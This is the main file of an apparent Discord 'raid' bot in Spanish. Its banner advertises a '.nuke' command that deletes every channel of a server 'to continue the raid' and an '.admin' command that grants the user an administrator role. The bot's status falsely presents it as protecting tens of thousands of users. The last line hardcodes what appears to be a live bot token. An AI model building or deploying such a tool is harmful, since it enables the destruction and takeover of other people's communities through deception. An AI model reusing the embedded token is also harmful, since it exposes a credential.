//const express = require('express');
//const bodyParser = require('body-parser');
//const database = require('./db');

//const app = express();

//app.use(bodyParser.json());
//app.use(bodyParser.urlencoded({ extended: true }));

//app.use(express.static('public'));

//app.get('/', (req, res) => {
  //res.send('Express');
//});

//app.listen(3000, () => console.log('Servidor Iniciado'));

////////////////////////////////////////////
const Discord = require('discord.js');
const client = new Discord.Client();

const token = process.env.token;

const chalk = require('chalk');

const db = require('megadb');
let squad = new db.crearDB('squad');

const fs = require('fs');
let { readdirSync } = require('fs');


  console.log(chalk.yellow(`
██████╗ ███████╗███████╗████████╗███████╗████████╗███████╗            ██████╗  █████╗ ██╗   ██╗
██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔════╝╚══██╔══╝██╔════╝           ██╔════╝ ██╔══██╗╚██╗ ██╔╝
██████╔╝█████╗  ███████╗   ██║   █████╗     ██║   █████╗             ██║  ███╗███████║ ╚████╔╝ 
██╔═══╝ ██╔══╝  ╚════██║   ██║   ██╔══╝     ██║   ██╔══╝             ██║   ██║██╔══██║  ╚██╔╝  
██║     ███████╗███████║   ██║   ███████╗   ██║   ███████╗    ██╗    ╚██████╔╝██║  ██║   ██║       
╚═╝     ╚══════╝╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝    ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                                                                                               
`));



  console.log(chalk.red(`  
                             ╔═╗┌─┐┌┬┐┌─┐┌┐┌┌┬┐┌─┐┌─┐
                             ║  │ ││││├─┤│││ │││ │└─┐
                             ╚═╝└─┘┴ ┴┴ ┴┘└┘─┴┘└─┘└─┘

                         ═╦══════════════════════════╦═
                  ╚══╦════╩═════════════╦════════════╩════╦══╝
                 ╔═══╩══════════════════╩═════════════════╩═══╗
                 ║.nuke║ > Elimina todos los canales          ║
                 ║═════║y deja solo 1 para seguir             ║
                 ║                 con el raid.               ║
                 ║ -------------------------------------------║
                 ║.admin║ > Te crea un rol y te lo pone con   ║  
                 ║══════║   permisos de administrador.        ║
                 ║                                            ║ 
                 ║--------------------------------------------║
                 ║      ║                                    ║
                 ║══════║                                     ║
                 ║                                            ║
                 ║                                            ║
                 ╚════════════════════════════════════════════╝
`));




client.on("ready", () => {
  console.log(chalk.red(`${client.user.tag} esta listo!`));
  presencia();
});

function presencia() {
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: "Protegiendo 79 servidores y 34670 usuarios!",
      type: "STREAMING"

    }
  });
}

//Handler

client.commands = new Discord.Collection();
const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));

for (const file of commandFiles) {
  const command = require(`./commands/${file}`);
  client.commands.set(command.name, command);
}

client.on('message', (message) => {

  let prefix = 'f!'

  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;

  let usuario = message.mentions.members.first() || message.member;
  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();

  let cmd = client.commands.find((c) => c.name === command || c.alias && c.alias.includes(command));
  if (cmd) {
    cmd.execute(client, message, args)

  }

});





client.login("ODM2MDIzNDY1MTc2NzI3NTU0.YIX9hg.XDV6ERJlbEzU6ahFSBo2UU_E9qU");
